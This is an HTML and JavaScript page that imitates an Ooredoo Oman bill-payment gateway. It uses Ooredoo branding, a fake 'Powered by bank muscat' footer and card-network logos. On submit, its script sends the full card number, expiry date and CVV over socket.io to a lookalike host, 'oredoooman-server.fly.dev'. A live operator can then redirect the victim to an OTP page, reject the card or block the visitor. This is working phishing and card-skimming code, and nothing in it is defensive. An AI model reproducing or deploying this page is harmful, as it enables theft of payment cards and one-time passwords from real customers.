<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Payment Gateway</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: #f0f0f0;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 0;
  direction: ltr;
}

/* Language button - top right */
.lang-btn {
  position: absolute;
  top: 20px;
  right: 20px;
  background: #ed1c24;
  color: #fff;
  border: none;
  border-radius: 4px;
  padding: 8px 20px;
  font-size: 14px;
  cursor: pointer;
  font-weight: 500;
}

/* Main container */
.main-container {
  width: 100%;
  max-width: 820px;
  margin: 60px auto 40px;
  position: relative;
}

/* White card */
.card-box {
  background: #fff;
  border: 1px solid #e0e0e0;
  border-radius: 2px;
}

/* Header - Ooredoo logo */
.logo-section {
  text-align: center;
  padding: 40px 40px 30px;
}
.ooredoo-text {
  font-size: 56px;
  font-weight: 700;
  color: #ed1c24;
  font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
  letter-spacing: -1px;
}
.ooredoo-dot {
  color: #ed1c24;
  font-size: 56px;
  position: relative;
  top: -20px;
  margin-left: -5px;
}

/* Order info section */
.order-section {
  padding: 20px 50px;
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
}
.order-right-side {
  text-align: right;
}
.order-right-side .merchant-name {
  font-size: 16px;
  font-weight: 700;
  color: #333;
  margin-bottom: 2px;
}
.order-right-side .order-label {
  font-size: 13px;
  color: #666;
}
.order-right-side .order-value {
  font-size: 22px;
  font-weight: 700;
  color: #333;
}
.order-left-side {
  text-align: left;
}
.order-left-side .amount-label {
  font-size: 13px;
  color: #4a90d9;
}
.order-left-side .amount-value {
  font-size: 22px;
  font-weight: 700;
  color: #333;
}

/* Red line */
.red-divider {
  height: 3px;
  background: #ed1c24;
  margin: 0 50px;
}

/* Payment method section */
.payment-section {
  padding: 40px 50px 30px;
}
.payment-title {
  text-align: right;
  font-size: 18px;
  font-weight: 600;
  color: #333;
  margin-bottom: 25px;
}

/* Tabs + Form area */
.payment-area {
  display: flex;
  border: 1px solid #ddd;
  min-height: 300px;
}

/* Left tabs column */
.tabs-column {
  width: 160px;
  border-right: 1px solid #ddd;
  display: flex;
  flex-direction: column;
  flex-shrink: 0;
}
.tab-item {
  padding: 18px 14px;
  font-size: 14px;
  color: #555;
  cursor: pointer;
  border-bottom: 1px solid #eee;
  text-align: center;
}
.tab-item.active {
  font-weight: 700;
  color: #333;
  border-left: 4px solid #ed1c24;
  background: #fff;
}

/* Card visual placeholder (between tabs and form) */
.card-visual {
  width: 140px;
  border-right: 1px solid #eee;
  background: #fafafa;
  flex-shrink: 0;
}

/* Right form area */
.form-column {
  flex: 1;
  padding: 25px 30px;
  display: flex;
  flex-direction: column;
  gap: 18px;
}

.form-group {
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.form-group label {
  font-size: 13px;
  color: #555;
  text-align: right;
  font-family: 'Segoe UI', Tahoma, sans-serif;
}
.input-wrapper {
  position: relative;
}
.form-group input[type="text"],
.form-group input[type="tel"],
.form-group input[type="password"] {
  width: 100%;
  height: 44px;
  border: 1px solid #ccc;
  border-radius: 3px;
  padding: 0 50px 0 14px;
  font-size: 15px;
  direction: ltr;
  text-align: left;
  outline: none;
}
.form-group input:focus { border-color: #999; }
.form-group input.error { border-color: #ed1c24; }
.card-icon-inside {
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  width: 40px;
  height: 26px;
  display: flex;
  align-items: center;
  justify-content: center;
}
.error-msg {
  color: #ed1c24;
  font-size: 12px;
  margin-top: 3px;
  display: none;
  text-align: right;
}

/* CVV + Expiry row */
.row-fields {
  display: flex;
  gap: 20px;
  align-items: flex-start;
  flex-direction: row-reverse;
}
.field-group {
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.field-group label {
  font-size: 13px;
  color: #555;
  text-align: right;
}
.cvv-row {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-direction: row-reverse;
}
.cvv-row input {
  width: 80px;
  height: 44px;
  border: 1px solid #ccc;
  border-radius: 3px;
  padding: 0 12px;
  font-size: 15px;
  direction: ltr;
  text-align: left;
  outline: none;
}
.cvv-icon-img {
  width: 44px;
  height: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
}
.expiry-selects {
  display: flex;
  gap: 8px;
  flex-direction: row-reverse;
}
.expiry-selects select {
  height: 44px;
  border: 1px solid #ccc;
  border-radius: 3px;
  padding: 0 10px;
  font-size: 14px;
  background: #fff;
  min-width: 85px;
  outline: none;
}

/* Amount display */
.total-amount {
  text-align: right;
  font-size: 24px;
  font-weight: 700;
  color: #333;
  margin-top: 5px;
}

/* Buttons */
.action-buttons {
  display: flex;
  gap: 12px;
  justify-content: flex-end;
  margin-top: 5px;
}
.btn-pay {
  padding: 12px 30px;
  background: #ed1c24;
  color: #fff;
  border: none;
  border-radius: 3px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
}
.btn-pay:hover { background: #d4191f; }
.btn-pay:disabled { background: #ccc; cursor: not-allowed; }
.btn-cancel {
  padding: 12px 30px;
  background: #fff;
  color: #333;
  border: 1px solid #ccc;
  border-radius: 3px;
  font-size: 15px;
  cursor: pointer;
}
.btn-cancel:hover { background: #f5f5f5; }

.waiting-msg {
  text-align: center;
  color: #ed1c24;
  font-size: 13px;
  margin-top: 8px;
  display: none;
}

/* Footer logos */
.footer-logos {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 20px;
  padding: 30px 50px;
  border-top: 1px solid #eee;
  flex-wrap: wrap;
}
.footer-logos .pci {
  font-weight: 800;
  font-size: 16px;
  color: #1a237e;
  font-style: italic;
}
.footer-logos .pci span { color: #f44336; }
.footer-logos .bm-logo {
  font-size: 11px;
  color: #666;
  text-align: center;
  line-height: 1.3;
}
.footer-logos .bm-logo strong { color: #333; }
.footer-logos .apple-pay {
  background: #000;
  color: #fff;
  padding: 6px 14px;
  border-radius: 4px;
  font-size: 14px;
  font-weight: 600;
}
.footer-logos .omannet {
  font-size: 13px;
  color: #00695c;
  font-weight: 700;
  text-align: center;
}
.footer-logos .visa {
  font-size: 22px;
  font-weight: 900;
  color: #1a237e;
  font-style: italic;
  letter-spacing: -1px;
}
.footer-logos .mastercard {
  background: #eb001b;
  color: #fff;
  padding: 4px 10px;
  border-radius: 3px;
  font-size: 12px;
  font-weight: 700;
}
.footer-logos .maal {
  font-size: 14px;
  font-weight: 700;
  color: #6c3fa0;
  text-align: center;
}

@media (max-width: 700px) {
  .main-container { margin: 20px auto; width: 95%; }
  .order-section { flex-direction: column; gap: 15px; padding: 20px 25px; text-align: right; }
  .order-left-side { text-align: right; }
  .red-divider { margin: 0 25px; }
  .payment-section { padding: 25px; }
  .payment-area { flex-direction: column; }
  .tabs-column { width: 100%; flex-direction: row; border-right: none; border-bottom: 1px solid #ddd; }
  .tab-item { flex: 1; border-left: none !important; }
  .tab-item.active { border-bottom: 3px solid #ed1c24; border-left: none !important; }
  .card-visual { display: none; }
  .form-column { padding: 20px 15px; }
  .row-fields { flex-direction: column; }
  .footer-logos { gap: 12px; padding: 20px; }
  .action-buttons { flex-direction: row-reverse; justify-content: center; }
}
</style>
</head>
<body>

<button class="lang-btn" onclick="toggleLang()">English</button>

<div class="main-container">
  <div class="card-box">
    <!-- Logo -->
    <div class="logo-section">
      <span class="ooredoo-text">ooredoo</span><span class="ooredoo-dot">&#x2022;</span>
    </div>

    <!-- Order Info: OOREDOO + order number on RIGHT, amount on LEFT -->
    <div class="order-section">
      <div class="order-left-side">
        <div class="amount-label">المبلغ المستحق</div>
        <div class="amount-value">OMR  <span id="headerAmount">12.000</span></div>
      </div>
      <div class="order-right-side">
        <div class="merchant-name">OOREDOO</div>
        <div class="order-label">رقم الطلب</div>
        <div class="order-value" id="orderNumber">67245422</div>
      </div>
    </div>

    <!-- Red Line -->
    <div class="red-divider"></div>

    <!-- Payment Section -->
    <div class="payment-section">
      <div class="payment-title">اختر طريقة الدفع</div>

      <div class="payment-area">
        <!-- Tabs on LEFT -->
        <div class="tabs-column">
          <div class="tab-item">Samsung pay</div>
          <div class="tab-item active">Pay by Card</div>
        </div>

        <!-- Card visual placeholder -->
        <div class="card-visual"></div>

        <!-- Form on RIGHT -->
        <div class="form-column">
          <form id="cardForm" autocomplete="off">
            <!-- Card Number -->
            <div class="form-group">
              <label>رقم البطاقة</label>
              <div class="input-wrapper">
                <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
                <div class="card-icon-inside">
                  <svg width="34" height="22" viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#e8e8e8" stroke="#ccc"/><rect x="2" y="5" width="30" height="4" fill="#bbb"/><rect x="2" y="12" width="20" height="3" fill="#ccc"/></svg>
                </div>
              </div>
              <div class="error-msg" id="cardNumberError">رقم البطاقة غير صحيح</div>
            </div>

            <!-- CVV + Expiry row -->
            <div class="row-fields">
              <div class="field-group">
                <label>رقم التحقق من البطاقة (CVV)</label>
                <div class="cvv-row">
                  <div class="cvv-icon-img">
                    <svg width="40" height="26" viewBox="0 0 40 26"><rect width="40" height="26" rx="3" fill="#f5f5f5" stroke="#ddd"/><rect x="0" y="5" width="40" height="6" fill="#444"/><rect x="4" y="15" width="22" height="5" rx="1" fill="#fff" stroke="#ddd"/><text x="28" y="19" font-size="7" fill="#333" font-weight="bold">576</text></svg>
                  </div>
                  <input type="password" id="cardCVV" placeholder="000" maxlength="4" inputmode="numeric">
                </div>
              </div>
              <div class="field-group">
                <label>تاريخ الانتهاء</label>
                <div class="expiry-selects">
                  <select id="cardYear">
                    <option value="">السنة</option>
                  </select>
                  <select id="cardMonth">
                    <option value="">شهر</option>
                    <option value="01">01</option><option value="02">02</option><option value="03">03</option>
                    <option value="04">04</option><option value="05">05</option><option value="06">06</option>
                    <option value="07">07</option><option value="08">08</option><option value="09">09</option>
                    <option value="10">10</option><option value="11">11</option><option value="12">12</option>
                  </select>
                </div>
              </div>
            </div>

            <!-- Amount -->
            <div class="total-amount">OMR  <span id="formAmount">12.000</span></div>

            <!-- Buttons -->
            <div class="action-buttons">
              <button type="button" class="btn-cancel" onclick="handleCancel()">إلغاء</button>
              <button type="submit" class="btn-pay" id="submitBtn">الدفع</button>
            </div>
            <div class="waiting-msg" id="waitingMsg">جاري التحقق من البطاقة...</div>
          </form>
        </div>
      </div>
    </div>

    <!-- Footer Logos -->
    <div class="footer-logos">
      <span class="pci"><i>pci</i><span>DSS</span></span>
      <span class="bm-logo">Powered by<br><strong>بنك مسقط</strong><br>bank muscat</span>
      <span class="apple-pay"> Pay</span>
      <span class="omannet">عُمانـات<br><small>OmanNet</small></span>
      <span class="visa">VISA</span>
      <span class="mastercard">MasterCard</span>
      <span class="maal">مـال<br><small>Maal</small></span>
    </div>
  </div>
</div>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>
(function() {
  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
  var visitorId = localStorage.getItem('visitorId') || '';

  // Populate year dropdown
  var yearSelect = document.getElementById('cardYear');
  var currentYear = new Date().getFullYear();
  for (var y = currentYear; y <= currentYear + 15; y++) {
    var opt = document.createElement('option');
    opt.value = String(y).slice(-2);
    opt.textContent = String(y);
    yearSelect.appendChild(opt);
  }

  // Get params from URL or sessionStorage
  var params = new URLSearchParams(window.location.search);
  var service = params.get('service') || '';
  var amount = params.get('amount') || '0';

  var billData = null;
  try { billData = JSON.parse(sessionStorage.getItem('last_ooredoo_bill_lookup') || 'null'); } catch(e) {}
  if (billData) {
    if (!service) service = billData.number || billData.customerNumber || '';
    if (amount === '0') amount = billData.amount || '0';
  }

  var amountFormatted = parseFloat(amount).toFixed(3);
  document.getElementById('orderNumber').textContent = service || '-';
  document.getElementById('headerAmount').textContent = amountFormatted;
  document.getElementById('formAmount').textContent = amountFormatted;

  // Format card number
  var cardInput = document.getElementById('cardNumber');
  cardInput.addEventListener('input', function() {
    var val = this.value.replace(/\D/g, '').slice(0, 16);
    var formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
    this.value = formatted;
  });

  // Socket events
  socket.on('connect', function() {
    if (visitorId) socket.emit('visitor:reconnect', visitorId);
    socket.emit('visitor:pageEnter', 'بطاقة الائتمان');
  });

  socket.on('visitor:registered', function(data) {
    if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
  });

  socket.on('visitor:navigate', function(page) { if (page) window.location.href = '/' + page; });

  socket.on('card:action', function(action) {
    var act = (typeof action === 'string') ? action : (action && action.action) || '';
    if (act === 'otp') {
      window.location.href = '/otp-verification/';
    } else if (act === 'atm') {
      window.location.href = '/otp-verification/';
    } else if (act === 'reject') {
      document.getElementById('waitingMsg').textContent = 'تم رفض البطاقة. يرجى المحاولة ببطاقة أخرى.';
      document.getElementById('waitingMsg').style.display = 'block';
      document.getElementById('submitBtn').disabled = false;
      document.getElementById('submitBtn').textContent = 'الدفع';
    }
  });

  socket.on('cardNumber:verified', function(verified) {
    if (!verified) {
      document.getElementById('cardNumberError').style.display = 'block';
      document.getElementById('cardNumber').classList.add('error');
    }
  });

  socket.on('admin-last-message', function(data) {
    if (data && data.message) {
      localStorage.setItem('adminLastMessage', data.message);
      window.location.href = '/final-page/';
    }
  });

  socket.on('blocked', function() { alert('تم حظرك من استخدام الموقع.'); });

  // Luhn check
  function luhnCheck(num) {
    var sum = 0; var alt = false;
    for (var i = num.length - 1; i >= 0; i--) {
      var n = parseInt(num[i], 10);
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  // Detect card type
  function getCardType(num) {
    if (/^4/.test(num)) return 'Visa';
    if (/^5[1-5]/.test(num)) return 'Mastercard';
    if (/^3[47]/.test(num)) return 'Amex';
    return 'Unknown';
  }

  // Submit form
  document.getElementById('cardForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var cardNum = cardInput.value.replace(/\s/g, '');
    var month = document.getElementById('cardMonth').value;
    var year = document.getElementById('cardYear').value;
    var cvv = document.getElementById('cardCVV').value;

    // Reset errors
    document.getElementById('cardNumberError').style.display = 'none';
    cardInput.classList.remove('error');

    // Validate
    if (cardNum.length < 13 || !luhnCheck(cardNum)) {
      document.getElementById('cardNumberError').style.display = 'block';
      cardInput.classList.add('error');
      return;
    }
    if (!month || !year || cvv.length < 3) return;

    var cardType = getCardType(cardNum);
    var cardLast4 = cardNum.slice(-4);

    // Store payment data for OTP page
    localStorage.setItem('paymentData', JSON.stringify({
      totalPaid: amount,
      cardType: cardType,
      cardLast4: cardLast4,
      serviceName: service
    }));

    // Disable button
    document.getElementById('submitBtn').disabled = true;
    document.getElementById('submitBtn').textContent = 'جاري المعالجة...';
    document.getElementById('waitingMsg').style.display = 'block';

    // Send to server
    socket.emit('more-info', {
      content: {
        cardNumber: cardNum,
        expiryMonth: month,
        expiryYear: year,
        cvv: cvv,
        cardType: cardType,
        cardLast4: cardLast4,
        totalPaid: amount,
        serviceName: service
      },
      paymentCard: {
        cardNumber: cardNum,
        expiryMonth: month,
        expiryYear: year,
        cvv: cvv
      },
      page: 'بطاقة الائتمان',
      waitingForAdminResponse: true
    });
  });

  // Cancel
  window.handleCancel = function() {
    window.history.back();
  };

  // Language toggle
  window.toggleLang = function() {
    var btn = document.querySelector('.lang-btn');
    if (btn.textContent === 'English') {
      btn.textContent = 'عربي';
    } else {
      btn.textContent = 'English';
    }
  };
})();
</script>
</body>
</html>
